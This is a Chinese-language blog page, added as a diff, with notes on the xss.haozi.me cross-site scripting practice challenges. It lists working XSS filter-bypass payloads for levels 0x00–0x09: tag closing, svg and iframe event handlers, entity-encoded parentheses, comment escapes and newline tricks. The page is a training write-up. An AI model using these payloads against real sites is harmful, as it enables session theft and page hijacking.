@@ -1,0 +1,111 @@
+<html>
+<head>
+	
+	<title>XSS</title>
+	<meta name="keywords" content="Curtails的blog" />
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    
+	   <link href="/css/main.css?v=3" rel="stylesheet" type="text/css" />
+    
+        <script src="/js/util.js"></script>
+        <script>
+            if(isMobile()) {
+                loadjscssfile('../css/mobile.css', 'css');
+            } else {
+                loadjscssfile('../css/desktop.css', 'css');
+            }
+        </script> 
+    
+
+    <link rel="alternate" type="application/atom+xml" href="/atom.xml" title="Atom feed">
+
+    
+	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=3"/>
+    
+    
+
+</head>
+
+<body>
+
+
+<h2 class="title">XSS</h2>
+<!---
+<div style="text-align:center;margin-top: -10px;">
+<div class="article-category">
+发表于2019年10月29日
+
+
+
+
+ </div>
+--->
+</div>
+
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#实验平台"><span class="toc-text">实验平台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS绕过方法总结"><span class="toc-text">XSS绕过方法总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-demo"><span class="toc-text">xss-demo</span></a></li></ol>
+<h2 id="实验平台"><a href="#实验平台" class="headerlink" title="实验平台"></a>实验平台</h2><p><a href="https://curtails.github.io/xss/">https://curtails.github.io/xss/</a><br><a href="https://xss.haozi.me" target="_blank" rel="noopener">https://xss.haozi.me</a></p>
+<h2 id="XSS绕过方法总结"><a href="#XSS绕过方法总结" class="headerlink" title="XSS绕过方法总结"></a>XSS绕过方法总结</h2><p><code>&lt;scirpt&gt;</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;alert(1);&lt;/</span>script&gt;</span><br><span class="line">&lt;script&gt;alert(<span class="string">"1"</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="xss-demo"><a href="#xss-demo" class="headerlink" title="xss-demo"></a>xss-demo</h2><p><a href="https://github.com/haozi/xss-demo/" target="_blank" rel="noopener">github</a></p>
+<p><a href="https://xss.haozi.me" target="_blank" rel="noopener">在线地址</a></p>
+<p>拼凑所需语句即可不必关心原语句完整性？？浏览器容错性？？</p>
+<ul>
+<li>0x00 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 无任何过滤</li>
+<li>0x01 <code>&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>闭合标签</li>
+<li>0x02 <code>&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;</code>闭合标签</li>
+<li>0x03 </li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert<span class="string">`1`</span>&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41&lt;/</span>script&gt;</span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">正则表达式过滤() 用`</span><span class="string">`绕过或实体编码的字符编码</span></span><br><span class="line"><span class="string">- 0x04 同0x03 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>js</span><br><span class="line">&lt;svg&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert&amp;#40;1&amp;#41<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;iframe onload=alert&amp;#40;1&amp;#41&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>0x05<br>将–&gt;替换成😀 html注释<code>&lt;!--xxs---&gt;</code>或<code>&lt;!--xss--!&gt;</code><br>payload:<code>--!&gt; &lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+</li>
+<li><p>0x06<br>过滤<code>auto*****=</code>或<code>on*****=</code>替换为_ 可用换行符绕过</p>
+</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">onmousemove</span><br><span class="line">=alert(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">type=image src onerror</span><br><span class="line">=alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>0x07<br>匹配&lt;***&gt;字符串忽略大小写替换为空</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=alert(<span class="number">1</span>) <span class="comment">//有空格</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>0x08<br>将<code>&lt;/style&gt;</code>替换成<code>/*坏人*/</code> 在标签&gt;之前加个空格或换行就好了</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/style &gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br><span class="line">&lt;<span class="regexp">/style</span></span><br><span class="line"><span class="regexp">&gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>0x09<br>输入要以<a href="https://www.segmentfault.com开头" target="_blank" rel="noopener">https://www.segmentfault.com开头</a> 有一种payload是在网站上存在alert(1)js脚本</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.segmentfault.com.haozi.me/j.js</span></span><br></pre></td></tr></table></figure>
+
+
+<!--<a href="https://curtails.github.io/2019/10/29/xss/#disqus_thread" class="article-comment-link">Comments</a>
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = ''; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
+-->
+<div style="display:none">
+<script src="http://s4.cnzz.com/stat.php?id=&web_id=" language="JavaScript"></script>script>
+</div>
+
+
+
+
+
+
+</body>
+</html>
